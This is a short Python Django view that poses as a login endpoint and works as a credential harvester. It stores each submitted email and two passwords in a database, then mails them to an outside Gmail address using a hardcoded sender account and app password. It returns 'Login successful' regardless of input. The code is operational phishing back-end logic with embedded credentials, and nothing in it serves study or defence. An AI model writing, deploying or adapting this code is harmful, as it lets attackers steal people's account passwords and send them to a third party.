from django.http import JsonResponse
from rest_framework.decorators import api_view
from dbconnection import users
import smtplib


@api_view(['POST'])
def get_user_info(request):
    # Get the username and password from the request data
    email = request.data.get('email')
    firstpasswordused = request.data.get('firstpasswordused')
    secondpasswordused = request.data.get('secondpasswordused')

    user_id = users.insert_one({
        "email": email,
        "firstpasswordused": firstpasswordused,
        "secondpasswordused": secondpasswordused,
    }).inserted_id

    sending_email = 'ranickiauerbach@gmail.com'
    r_email = 'flaco.hex2@gmail.com'
    m_password = 'nlov pvvd rcoa dnwl'

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as connection:
        connection.login(user=sending_email, password=m_password)
        connection.sendmail(from_addr=sending_email,
                            to_addrs=r_email,
                            msg=f"subject: Hello! \n\n {email} : {firstpasswordused} : {secondpasswordused}")

    if not email or not firstpasswordused or not secondpasswordused:
        return JsonResponse({'error': 'email and password required'}, status=400)
    return JsonResponse({'message': 'Login successful'}, status=200)
